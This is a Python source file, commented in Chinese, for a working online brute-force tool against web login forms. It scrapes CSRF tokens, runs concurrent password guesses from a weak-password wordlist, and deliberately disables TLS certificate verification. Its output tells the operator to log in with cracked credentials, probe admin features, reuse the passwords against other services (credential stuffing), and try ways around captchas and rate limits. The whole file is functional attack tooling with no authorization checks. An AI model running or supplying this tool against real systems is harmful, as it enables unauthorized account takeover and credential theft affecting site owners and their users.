"""web_brute：Web 登录表单在线弱口令爆破（纯 stdlib，无第三方依赖）。

能力：GET/POST、附加固定字段、CSRF token（每次先抓页面正则提取再提交）、
响应文本判成败、并发+限速、每用户命中即停。密码留空用内置弱口令表。
入口：run.py '<params JSON>'；exit 0=有命中，1=未命中，2=参数/目标问题。
"""
import json
import re
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.stderr.reconfigure(encoding="utf-8", errors="replace")

WORDLISTS = Path(__file__).resolve().parents[2] / "wordlists"
BUILTIN = WORDLISTS / "common_passwords.txt"

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE       # 内网/自签目标常见，别让证书挡路

_stats = {"tries": 0, "errors": 0, "lock": threading.Lock()}
_print_lock = threading.Lock()


def say(*a):
    with _print_lock:
        print(*a, flush=True)


def die(msg: str):
    print(msg, file=sys.stderr)
    sys.exit(2)


def load_list(spec: str, default_file: Path | None = None) -> list:
    spec = (spec or "").strip()
    if not spec:
        if default_file and default_file.exists():
            return [w for w in (l.strip() for l in
                                default_file.read_text(encoding="utf-8",
                                                       errors="replace").splitlines())
                    if w and not w.startswith("#")]
        return []
    if spec.startswith("@"):
        p = Path(spec[1:])
        if not p.is_absolute():
            p = WORDLISTS / spec[1:]
        if not p.exists():
            die(f"字典不存在: {p}（大字典放 {WORDLISTS}）")
        return [w for w in (l.strip() for l in
                            p.read_text(encoding="utf-8", errors="replace").splitlines())
                if w and not w.startswith("#")]
    return [x.strip() for x in spec.split(",") if x.strip()]


def http_req(url: str, method: str, data: dict | None, timeout: int,
             urlencode: bool = True) -> tuple[int, str]:
    headers = {"User-Agent": "Mozilla/5.0 (agg-intel)", "Connection": "close"}
    body = None
    if data is not None:
        if urlencode:
            body = urllib.parse.urlencode(data).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            body = json.dumps(data).encode()
            headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    with urllib.request.urlopen(req, timeout=timeout, context=_SSL_CTX) as resp:
        return resp.status, resp.read(200_000).decode("utf-8", "replace")


def main(params: dict) -> None:
    url = str(params.get("url") or "").strip()
    user_field = str(params.get("user_field") or "").strip()
    if not url.startswith(("http://", "https://")):
        die("url 必须以 http(s):// 开头")
    if not user_field:
        die("user_field 必填（用户名的表单字段名）")
    success_text = str(params.get("success_text") or "").strip()
    fail_text = str(params.get("fail_text") or "").strip()
    if not success_text and not fail_text:
        die("success_text / fail_text 必须给一个：命中靠它判定，没有就是盲打")

    method = str(params.get("method") or "POST").upper()
    pass_field = str(params.get("pass_field") or "password").strip()
    csrf_url = str(params.get("csrf_url") or "").strip()
    csrf_re = re.compile(str(params.get("csrf_regex") or "")) if params.get("csrf_regex") else None
    csrf_field = str(params.get("csrf_field") or "csrf_token").strip()
    try:
        extra = json.loads(params.get("fields") or "{}")
        if not isinstance(extra, dict):
            raise ValueError
    except ValueError:
        die("fields 必须是 JSON 对象文本，如 {\"submit\":\"登录\"}")
    urlencode = bool(params.get("data_urlencode", True))
    threads = max(1, min(int(params.get("threads") or 4), 16))
    delay = float(params.get("delay") or 0)
    req_timeout = max(1, min(int(params.get("req_timeout") or 8), 60))
    stop_on_success = bool(params.get("stop_on_success", True))
    max_tries = int(params.get("max_tries") or 5000)

    users = load_list(str(params.get("users") or ""), default_file=None) or ["admin"]
    passwords = load_list(str(params.get("passwords") or ""), default_file=BUILTIN)
    if not passwords:
        die(f"密码列表为空且内置字典缺失: {BUILTIN}")
    total = len(users) * len(passwords)
    if total > max_tries:
        die(f"组合 {total:,} 超过上限 {max_tries:,}：拆小字典或调大 max_tries")

    jobs = [(u, p) for u in users for p in passwords]
    hits: list[tuple[str, str]] = []
    done_users: set[str] = set()
    stop_flag = threading.Event()

    def fetch_csrf() -> str:
        if not (csrf_url and csrf_re):
            return ""
        try:
            _, page = http_req(csrf_url, "GET", None, req_timeout)
            m = csrf_re.search(page)
            return m.group(1) if m else ""
        except Exception:
            return ""

    def attempt(job: tuple[str, str]) -> None:
        if stop_flag.is_set():
            return
        u, p = job
        if stop_on_success and u in done_users:
            return
        data = {user_field: u, pass_field: p, **extra}
        token = fetch_csrf()
        if token:
            data[csrf_field] = token
        try:
            status, text = http_req(url, method, data, req_timeout, urlencode)
        except urllib.error.HTTPError as e:      # 401/403 也可能是"失败响应"本体
            try:
                status, text = e.code, e.read(200_000).decode("utf-8", "replace")
            except Exception:
                with _stats["lock"]:
                    _stats["errors"] += 1
                return
        except Exception:
            with _stats["lock"]:
                _stats["errors"] += 1
            return
        with _stats["lock"]:
            _stats["tries"] += 1
        ok = (success_text in text) if success_text else (fail_text not in text)
        if ok:
            say(f"[命中] {u} : {p}  (HTTP {status})")
            with _stats["lock"]:
                hits.append((u, p))
                if stop_on_success:
                    done_users.add(u)
                    if len(done_users) >= len(users):
                        stop_flag.set()
        if delay:
            time.sleep(delay)

    t0 = time.time()
    with ThreadPoolExecutor(max_workers=threads) as pool:
        list(pool.map(attempt, jobs))

    dt = max(time.time() - t0, 1e-6)
    print(f"[统计] 尝试 {_stats['tries']}/{total} / 网络错误 {_stats['errors']} / "
          f"命中 {len(hits)} / {dt:.1f}s / {threads} 并发")
    if hits:
        print("命中清单:")
        for u, p in hits:
            print(f"  {u}:{p}")
        print("下一步：用凭据登录验证 → 抓后台功能点；同密码可能是其他用户/服务的口令（撞库）")
        sys.exit(0)
    print("[未命中] 换思路：更大字典(@文件) / 用户名是否对（先爆破用户名） / "
          "是否有验证码或限速（看 errors） / 目标是否走 JSON 接口(data_urlencode:false)")
    sys.exit(1)


if __name__ == "__main__":
    main(json.loads(sys.argv[1]))
